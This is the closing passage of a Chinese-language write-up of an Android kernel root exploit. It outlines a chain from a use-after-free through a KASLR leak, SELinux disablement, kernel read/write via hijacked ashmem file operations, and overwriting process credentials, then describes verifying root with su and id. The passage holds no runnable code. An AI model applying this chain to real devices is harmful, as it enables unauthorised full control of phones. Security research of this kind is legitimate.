父进程只有在收到完整报告且确认 `uid == 0 && euid == 0` 后，才记录 root handoff 完成。最终链路可以概括为：

```rust
GhostLock UAF
  -> rb-tree 受限写
  -> SELinux permissive
  -> perf 泄露 KASLR
  -> KernelSnitch + mm slab reclaim 得到 fake page
  -> 修改 ashmem miscdevice.fops
  -> fake fops 转换为 configfs kernel R/W
  -> 修改 pipe_buffer 得到物理页 R/W
  -> 修改 child cred / SID / seccomp
  -> 恢复 ashmem fops
  -> 放行 uid=0 root child 和 su daemon
```

## 10\. 运行结果

成功后可以在设备 shell 中运行 `su` ，再使用 `id` 和 `whoami` 验证身份：

!PLF110 root 成功截图

本 PoC 包含多处竞态、SLUB 回收和堆布局控制，运行结果具有概率性，并不能保证每次都成功。如果一次没有成功，请重启设备后再试；必要时可以多尝试几次。
